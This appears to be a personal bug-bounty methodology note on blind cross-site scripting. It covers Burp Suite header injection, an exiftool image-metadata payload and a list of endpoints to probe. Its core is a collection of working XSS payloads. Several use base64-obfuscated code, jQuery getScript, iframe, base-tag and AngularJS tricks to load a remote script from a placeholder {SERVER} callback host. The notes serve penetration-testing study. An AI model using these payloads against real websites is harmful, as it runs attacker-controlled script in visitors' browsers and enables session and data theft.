> [!abstract] Module: [[01-xss|← Back to XSS]] · Related: [[../../01-Fleeting/Write-up&Article&Hacktivity/Write-up/Write-Ups/Write-up-2026-07-04|Write-up 2026-07-04]]

#add-to-meth-BXSS-2026-07-04

# Blind XSS Methodology

## Automate With Burp Suite

1. Navigate to **Proxy > Settings > Match and Replace**.
2. Click 'Add' to create a new rule.
3. Set the rule to replace a common request header, like the User-Agent, with your Blind XSS payload.

### Headers to Test
- Referer
- Origin
- Cookie
- Accept
- Host
- X-Forwarded-For
- X-Api-Version

## Test on File (Image) Upload

- Try to upload `.html` file directly
- If only images allowed, use exiftool:
  ```
  exiftool -Comment='"><img src=x onerror=alert(1)>' test.jpg
  ```

## Advanced Payloads

```html
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```

## Endpoints to Test

- File upload
- Feedback forms
- Email subscription
- Parameters processed by analytic engines (UTM parameters are always a good start — find via Wayback Machine)
- Blogs and help documentation
- Invoices or receipts for orders
- Parameters that seem to do nothing
- Cookie parameters
- Check different fields/endpoints (registration vs profile edit may have different filters)

## References

1. [[Write-up-2026-07-04]]
